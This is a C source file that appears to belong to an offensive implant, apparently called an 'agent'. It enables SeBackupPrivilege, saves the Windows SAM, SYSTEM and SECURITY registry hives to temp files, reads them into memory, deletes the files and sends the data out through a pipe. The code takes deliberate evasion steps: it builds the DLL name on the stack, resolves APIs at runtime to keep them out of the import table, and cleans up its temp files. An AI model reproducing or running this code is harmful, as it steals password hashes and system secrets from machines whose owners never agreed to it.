/**
 * Registry hive extraction — save SAM/SYSTEM/SECURITY and send via pipe.
 *
 * Uses advapi32 Reg* APIs (resolved at runtime, no import table entry).
 * Enables SeBackupPrivilege so RegSaveKeyW works on protected hives.
 * Temp files are deleted immediately after reading into memory.
 */

#include <windows.h>
#include "../include/agent.h"
#include "../include/registry.h"

/* ── advapi32 function types ─────────────────────────────── */

typedef LONG  (WINAPI *fn_RegOpenKeyExW)(HKEY, LPCWSTR, DWORD, DWORD, PHKEY);
typedef LONG  (WINAPI *fn_RegSaveKeyW)(HKEY, LPCWSTR, LPVOID);
typedef LONG  (WINAPI *fn_RegCloseKey)(HKEY);
typedef BOOL  (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL  (WINAPI *fn_LookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
typedef BOOL  (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL, PVOID, DWORD, PVOID, PDWORD);

static fn_RegOpenKeyExW         pRegOpenKeyExW;
static fn_RegSaveKeyW           pRegSaveKeyW;
static fn_RegCloseKey           pRegCloseKey;
static fn_OpenProcessToken      pOpenProcessToken;
static fn_LookupPrivilegeValueW pLookupPrivilegeValueW;
static fn_AdjustTokenPrivileges pAdjustTokenPrivileges;

/* ── init ────────────────────────────────────────────────── */

BOOL init_registry(void) {
    /* Build library name on stack (no string in .rdata) */
    char lib[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    HMODULE adv = LoadLibraryA(lib);
    if (!adv) return FALSE;

    pRegOpenKeyExW         = (fn_RegOpenKeyExW)        GetProcAddress(adv, "RegOpenKeyExW");
    pRegSaveKeyW           = (fn_RegSaveKeyW)          GetProcAddress(adv, "RegSaveKeyW");
    pRegCloseKey           = (fn_RegCloseKey)           GetProcAddress(adv, "RegCloseKey");
    pOpenProcessToken      = (fn_OpenProcessToken)     GetProcAddress(adv, "OpenProcessToken");
    pLookupPrivilegeValueW = (fn_LookupPrivilegeValueW)GetProcAddress(adv, "LookupPrivilegeValueW");
    pAdjustTokenPrivileges = (fn_AdjustTokenPrivileges)GetProcAddress(adv, "AdjustTokenPrivileges");

    return pRegOpenKeyExW && pRegSaveKeyW && pRegCloseKey &&
           pOpenProcessToken && pLookupPrivilegeValueW && pAdjustTokenPrivileges;
}

/* ── privilege ───────────────────────────────────────────── */

static BOOL enable_backup_privilege(void) {
    HANDLE token;
    /* TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY = 0x0028 */
    if (!pOpenProcessToken((HANDLE)-1, 0x0028, &token))
        return FALSE;

    /* TOKEN_PRIVILEGES with 1 entry */
    struct {
        DWORD count;
        LUID  luid;
        DWORD attr;
    } tp;
    tp.count = 1;
    tp.attr  = 2; /* SE_PRIVILEGE_ENABLED */

    if (!pLookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &tp.luid)) {
        CloseHandle(token);
        return FALSE;
    }

    BOOL ok = pAdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(token);
    return ok;
}

/* ── hex helper (for temp file name) ─────────────────────── */

static void dword_to_hex(DWORD val, wchar_t *buf) {
    const wchar_t hex[] = L"0123456789abcdef";
    for (int i = 7; i >= 0; i--)
        *buf++ = hex[(val >> (i * 4)) & 0xF];
    *buf = L'\0';
}

/* ── save one hive, read into memory, delete temp file ───── */

static BOOL save_and_read_hive(const wchar_t *key_name, const wchar_t *temp_path,
                                BYTE **out_data, DWORD *out_size) {
    *out_data = NULL;
    *out_size = 0;

    HKEY hKey;
    /* KEY_READ = 0x20019 */
    if (pRegOpenKeyExW((HKEY)(ULONG_PTR)0x80000002 /* HKLM */,
                       key_name, 0, 0x20019, &hKey) != 0)
        return FALSE;

    DeleteFileW(temp_path);
    LONG rc = pRegSaveKeyW(hKey, temp_path, NULL);
    pRegCloseKey(hKey);
    if (rc != 0) return FALSE;

    /* Read file into memory */
    HANDLE hFile = CreateFileW(temp_path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DeleteFileW(temp_path);
        return FALSE;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        CloseHandle(hFile);
        DeleteFileW(temp_path);
        return FALSE;
    }

    BYTE *data = (BYTE *)VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) {
        CloseHandle(hFile);
        DeleteFileW(temp_path);
        return FALSE;
    }

    DWORD total = 0;
    while (total < file_size) {
        DWORD chunk = 0;
        if (!ReadFile(hFile, data + total, file_size - total, &chunk, NULL) || chunk == 0)
            break;
        total += chunk;
    }
    CloseHandle(hFile);
    DeleteFileW(temp_path);

    if (total != file_size) {
        VirtualFree(data, 0, MEM_RELEASE);
        return FALSE;
    }

    *out_data = data;
    *out_size = file_size;
    return TRUE;
}

/* ── main entry: dump all 3 hives through the pipe ───────── */

BOOL dump_registry_hives(HANDLE pipe) {
    enable_backup_privilege();

    /* Build unique temp paths from GetTickCount */
    wchar_t prefix[] = L"C:\\Windows\\Temp\\";
    wchar_t hex[9];
    dword_to_hex(GetTickCount(), hex);

    wchar_t sys_path[64], sam_path[64], sec_path[64];
    /* Manually concatenate: prefix + hex + "_s" / "_a" / "_e" */
    int pi = 0;
    while (prefix[pi]) { sys_path[pi] = sam_path[pi] = sec_path[pi] = prefix[pi]; pi++; }
    int hi = 0;
    while (hex[hi]) { sys_path[pi+hi] = sam_path[pi+hi] = sec_path[pi+hi] = hex[hi]; hi++; }
    int off = pi + hi;
    sys_path[off] = L's'; sys_path[off+1] = L'\0';
    sam_path[off] = L'a'; sam_path[off+1] = L'\0';
    sec_path[off] = L'e'; sec_path[off+1] = L'\0';

    /* Save and send each hive: SYSTEM, SAM, SECURITY */
    const wchar_t *keys[]  = { L"SYSTEM",  L"SAM",  L"SECURITY" };
    const wchar_t *paths[] = { sys_path,   sam_path, sec_path    };

    for (int i = 0; i < 3; i++) {
        BYTE *data = NULL;
        DWORD size = 0;

        if (save_and_read_hive(keys[i], paths[i], &data, &size) && data) {
            write_pipe(pipe, &size, 4);
            write_pipe(pipe, data, size);
            VirtualFree(data, 0, MEM_RELEASE);
        } else {
            DWORD zero = 0;
            write_pipe(pipe, &zero, 4);
        }
    }

    return TRUE;
}
